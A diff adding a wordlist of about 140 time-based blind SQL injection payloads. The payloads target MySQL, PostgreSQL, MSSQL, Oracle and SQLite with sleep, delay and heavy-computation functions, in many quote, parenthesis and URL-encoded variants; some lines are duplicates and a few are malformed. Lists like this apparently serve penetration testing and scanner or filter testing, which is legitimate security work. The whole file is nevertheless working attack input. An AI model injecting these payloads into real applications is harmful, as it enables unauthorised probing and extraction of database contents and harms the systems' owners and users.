@@ -1,0 +1,144 @@
+-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*2))END 
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR 
+BEGIN DBMS_LOCK.SLEEP(15); END; 
+; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15' 
+; WAIT FOR DELAY '00:00:15' 
+%20and%20(select*from(select(sleep(15)))a)--%20 
+%20AND%20(SELECT 4416 FROM (SELECT(SLEEP(15)))nUhT)) 
+' AND (SELECT 7551 FROM (SELECT(SLEEP(15)))QOUn) 
+(select*from(select(sleep(15)))a) 
+"sleep=3 
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) 
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) 
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) 
++or+sleep(0.000000001) 
+(select*from(select(sleep(2)))a) 
+'%2b(select*from(select(sleep(15)))a)%2b 
+1=benchmark(40000000,sha(1)) and 1 = 'balisong' 
+%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(15)))WUeh) 
+'%2b(select*from(select(sleep(15)))a)%2b' 
+' || pg_sleep(15)-- 
+sleep(15)# 
+1 or sleep(15)# 
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z 
+-sleep/*f*/(10) 
+%20AND%20SLEEP(15) 
+'%2b(select*from(select(sleep(15)))a)%2b' 
+WAITFOR DELAY '0:0:13'--" 
+(select*from(select(sleep(5)))a) 
+pg_sleep(__30__)-- 
+%2c(select*from(select(sleep(20)))a) 
+%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(15)))WUeh) 
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR' 
+'%2b(select*from(select(sleep(20)))a)%2b' 
++sleep(0.000000001) 
++or+sleep(0.000000001) 
+'+(select*from(select(if(1=1,sleep(20),false)))a)+' 
+" or sleep(15)# 
+' or sleep(15)# 
+" or sleep(15)=" 
+' or sleep(15)=' 
+1) or sleep(15)# 
+") or sleep(15)=" 
+') or sleep(15)=' 
+1)) or sleep(15)# 
+")) or sleep(15)=" 
+')) or sleep(15)=' 
+;waitfor delay '0:0:15'-- 
+);waitfor delay '0:0:15'-- 
+';waitfor delay '0:0:15'-- 
+";waitfor delay '0:0:15'-- 
+');waitfor delay '0:0:15'-- 
+");waitfor delay '0:0:15'-- 
+));waitfor delay '0:0:15'-- 
+'));waitfor delay '0:0:15'-- 
+"));waitfor delay '0:0:15'-- 
+benchmark(10000000,MD5(1))# 
+1 or benchmark(10000000,MD5(1))# 
+" or benchmark(10000000,MD5(1))# 
+' or benchmark(10000000,MD5(1))# 
+1) or benchmark(10000000,MD5(1))# 
+") or benchmark(10000000,MD5(1))# 
+') or benchmark(10000000,MD5(1))# 
+1)) or benchmark(10000000,MD5(1))# 
+")) or benchmark(10000000,MD5(1))# 
+')) or benchmark(10000000,MD5(1))# 
+pg_sleep(5)-- 
+1 or pg_sleep(15)-- 
+" or pg_sleep(15)-- 
+%22 or pg_sleep(15)-- 
+' or pg_sleep(15)-- 
+%27 or pg_sleep(15)-- 
+1) or pg_sleep(15)-- 
+") or pg_sleep(15)-- 
+%22) or pg_sleep(15)-- 
+') or pg_sleep(15)-- 
+%27) or pg_sleep(15)-- 
+1)) or pg_sleep(15)-- 
+")) or pg_sleep(15)-- 
+%22)) or pg_sleep(15)-- 
+')) or pg_sleep(15)-- 
+%27)) or pg_sleep(15)-- 
+AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe 
+AND (SELECT * FROM (SELECT(SLEEP(15)))YjoC) AND '%'=' 
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP) 
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)-- 
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)# 
+SLEEP(15)# 
+SLEEP(15)-- 
+SLEEP(15)=" 
+SLEEP(15)=' 
+or SLEEP(15) 
+or SLEEP(15)# 
+or SLEEP(15)-- 
+or SLEEP(15)=" 
+or SLEEP(15)=' 
+waitfor delay '00:00:15' 
+waitfor delay '00:00:15'-- 
+waitfor delay '00:00:15'# 
+benchmark(50000000,MD5(15)) 
+benchmark(50000000,MD5(15))-- 
+benchmark(50000000,MD5(15))# 
+or benchmark(50000000,MD5(15)) 
+or benchmark(50000000,MD5(15))-- 
+or benchmark(50000000,MD5(15))# 
+pg_SLEEP(15) 
+pg_SLEEP(15)-- 
+pg_SLEEP(15)# 
+or pg_SLEEP(15) 
+or pg_SLEEP(15)-- 
+or pg_SLEEP(15)# 
+'\" 
+AnD SLEEP(15) 
+AnD SLEEP(15)-- 
+AnD SLEEP(15)# 
+&&SLEEP(15) 
+&&SLEEP(15)-- 
+-sleep(1S5) 
+-benchmark(1000000000,1-1) 
+&&SLEEP(15)# 
+' AnD SLEEP(15) ANd '1 
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) 
+1; waitfor delay '0:0:5'-- 
+waitfor delay '0:0:5'-- 
+'&&SLEEP(15)&&'1 
+ORDER BY SLEEP(15) 
+ORDER BY SLEEP(15)-- 
+ORDER BY SLEEP(15)# 
+(SELECT * FROM (SELECT(SLEEP(15)))ecMj) 
+(SELECT * FROM (SELECT(SLEEP(15)))ecMj)# 
+(SELECT * FROM (SELECT(SLEEP(15)))ecMj)-- 
++benchmark(3200,SHA1(1))+' 
+(select(0)from(select(sleep(25)))v) 
++ SLEEP(10) + ' 
+RANDOMBLOB(500000000/2) 
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) 
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) 
+RANDOMBLOB(1000000000/2) 
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) 
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) 
+SLEEP(10)/*' or SLEEP(10) or '" or SLEEP(10) or "*/ 
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR' 
+'XOR(if(now()=sysdate(),sleep(6*6-25),0))OR' 
+referer- '+(select*from(select(sleep(15}}}a)+'
